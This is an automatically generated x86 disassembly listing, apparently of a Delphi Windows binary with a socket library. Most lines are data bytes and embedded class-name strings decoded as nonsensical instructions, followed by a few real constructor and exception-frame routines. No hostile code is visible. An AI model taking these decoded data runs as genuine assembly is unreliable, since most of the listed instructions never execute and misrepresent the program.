add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xc004032 ] ah
inc ebp
dec ecx
inc ebp
js r-xdata
jo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc00470a
add [ eax ] al
add [ ecx + ecx + 0x47 ] cl
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x13004032 ] ah
inc ebp
dec ecx
inc ecx
insb
jb r-xdata
imul ebp [ edi + 0x6e ] 0x470a5490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x9
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x17004032 ] ah
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
or al [ edi ]
or al 0x0
imul ebp [ edi + 0x6e ] 0xf400408d
or [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
imul esp [ ebp + 0x74 ] 0x74
popad
jns r-xdata
outsb
arpl [ gs : ebp + 0x64 ] si
sbb [ ebx ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or eax [ edi ]
or al 0x0
inc edi
jb r-xdata
xor al 0x40
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xf004032 ] ah
inc ebp
dec ecx
inc ebx
insb
outsd
jae r-xdata
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
arpl [ ebp + 0x66 ] sp
jne r-xdata
push 0x65637845
nop
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1e004032 ] ah
inc ebp
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ebx ] 0x1
inc edi
add [ eax + eax ] cl
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xe004032 ] ah
inc ebp
dec ecx
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x9074756f
ror [ ebx ] 0x1
inc eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx ] cl
inc edi
add [ eax + eax ] cl
insb
jns r-xdata
mov eax eax
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
inc eax
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
or eax [ edi ]
or al 0x0
or eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x47 ] dl
add [ eax + eax ] cl
or al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x3fffbfce ] ah
adc al 0x47
add [ 0x50644945 ] dl
jb r-xdata
inc ebp
dec ecx
push eax
mov al [ 0x470c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0x100047 ] ah
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
popad
insd
mov eax eax
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc00470d
add [ eax ] al
add [ ecx + ecx + 0x47 ] cl
add al ah
xor al 0x40
outsd
jb r-xdata
mov eax eax
je r-xdata
dec esi
cmp al 0xc
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx ] bh
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx ] ah
outsd
outsb
enter 0x470d 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
jb r-xdata
ror [ eax ] 0xd
inc edi
add [ eax ] al
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
or eax 0xc0047
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
inc eax
push 0x470d
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xd004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or eax 0xc0047
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
imul esp [ ebx + 0x65 ] 0x656d614e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xd ] ch
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
inc edi
add [ eax ] al
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push cs
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi ] cl
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x470d 0x0
or al 0x0
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x11004032 ] ah
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xe88c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00470e ] cl
add [ eax ] al
add [ ebp + ecx + 0x47 ] bh
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1b004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
inc edi
add [ eax + 0x13004032 ] ah
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
inc eax
shl [ esi + ecx ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0xc0047 ] bh
add [ eax ] al
jl r-xdata
jae r-xdata
nop
jae r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
dec ecx
outsb
je r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x14004032 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
pop eax
cmova eax [ eax ]
add [ eax ] al
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x14004032 ]
add [ eax ] al
jl r-xdata
popad
imul ebp [ ebp + 0x64 ] 0x470f5890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] bl
inc edi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx ] ah
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
cmova eax [ eax ]
or al 0x0
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
adc [ edi ] eax
or al 0x0
add [ eax ] al
jl r-xdata
push 0x6f727245
jb r-xdata
inc eax
jae r-xdata
add [ eax + 0x17004032 ] ah
inc ebp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc00470f
add [ eax ] al
add [ ebp + ecx + 0x47 ] bh
inc eax
add [ edi + ecx + 0x47 ] bh
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x1a004032 ]
popad
imul ebp [ ebp + 0x64 ] r-xdata
add ah dh
xor al 0x40
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
shr al 0x10
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
adc [ edi ] al
or al 0x0
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
inc edi
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xc4757d1
add [ eax ] al
add [ ebp + ecx + 0x47 ] bh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004710 ] cl
add [ eax ] al
add [ ebp + ecx + 0x47 ] bh
outsd
jb r-xdata
jb r-xdata
outsd
jb r-xdata
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x21004032 ]
jb r-xdata
jb r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1d004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
push ebx
jb r-xdata
adc [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax ] dl
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
inc ebp
jb r-xdata
and al 0x10
inc edi
add [ eax ] al
sub al 0x12
inc edi
pushfd
adc al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
adc al [ edi ]
or al 0x0
add [ eax ] al
jl r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx ] ch
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
shr [ edx + edx ] 0x47
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
jb r-xdata
sar [ ecx + edx + 0x47 ] 0x0
jb r-xdata
insb
inc ebp
jb r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x11004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
inc edi
add ah dh
xor al 0x40
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x24004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x22004032 ] ah
inc eax
je r-xdata
jb r-xdata
popad
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x21004032 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx + 0xc0047 ] bh
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push esp
jb r-xdata
add [ 0x53644945 ] bl
jb r-xdata
outsd
jb r-xdata
outsd
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
xor al [ fs : eax ]
mov al [ 0x22004032 ]
outsb
push eax
adc [ edi ] eax
jb r-xdata
inc ebp
jb r-xdata
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
outsd
outsb
outsb
jb r-xdata
jb r-xdata
nop
inc eax
add [ eax ] dl
adc eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx ] dl
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
sar [ ebx + edx + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
adc eax [ edi ]
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
in al 0x13
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
adc eax [ edi ]
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx + 0x47 ] cl
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
xor al [ fs : eax ]
mov al [ 0x1a004032 ]
push esp
dec esp
inc ebp
js r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1d004032 ] ah
inc ebp
dec ecx
push ebx
inc edi
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
xor al 0x40
inc edi
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x13
inc edi
add [ eax + eax ] cl
outsd
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
inc edi
inc eax
add ah ch
xor al 0x40
add al dh
nop
jb r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
pop ebx
pop ebp
retn 0x4
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
outsd
insd
insd
popad
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x10004032 ] ah
inc ebp
dec ecx
dec ecx
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
lea eax [ eax ]
lodsb [ esi ]
adc al 0x47
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004714 ] dh
add [ eax ] al
add [ ecx + ecx + 0x47 ] cl
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x8004032 ] ah
adc eax 0x450e0047
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
dec esp
adc al 0x47
add [ eax ] al
add [ eax ] al
sub_4714c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40badc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_471508
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40badc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_471550
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471575
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47157c
retn
sub_471588
out 0x48 al
add al ah
inc [ eax ]
add [ esi + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x48 ] ah
add al dl
inc [ eax ]
